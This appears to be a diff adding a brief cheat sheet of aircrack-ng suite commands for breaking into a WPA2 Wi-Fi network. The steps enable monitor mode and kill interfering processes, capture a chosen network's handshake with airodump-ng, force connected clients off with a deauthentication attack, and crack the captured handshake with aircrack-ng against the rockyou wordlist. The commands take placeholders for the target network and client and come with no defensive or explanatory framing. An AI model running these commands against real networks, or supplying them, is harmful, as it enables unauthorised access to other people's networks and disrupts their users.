@@ -1,0 +1,27 @@
+//Open Terminal Window 1
+
+airmon-ng start wlan0
+
+airmon-ng check kill
+
+iwconfig 
+
+airodump-ng -i wlan0mon
+
+airodump-ng --bssid "BSSID [Name of the wifi]" -c "Channel [channel column in list]" -w "[path of the output file .cap ]" wlan0mon
+
+//Open Terminal Window 2
+
+aireplay-ng -0 20 -a "BSSID [Name of the wifi]" -c "Station [Station column in the list]" wlan0mon
+
+aircrack-ng -a2 -b "BSSID [Name of the wifi]" -w "[path of the Wordlist] eg: [/usr/share/wordlists/rockyou.txt]" "[path of the input .cap file]"
+
+//After completion to restart the wifi drivers
+
+airmon-ng stop wlan0mon
+
+service network-manager restart
+
+exit
+
+//Done
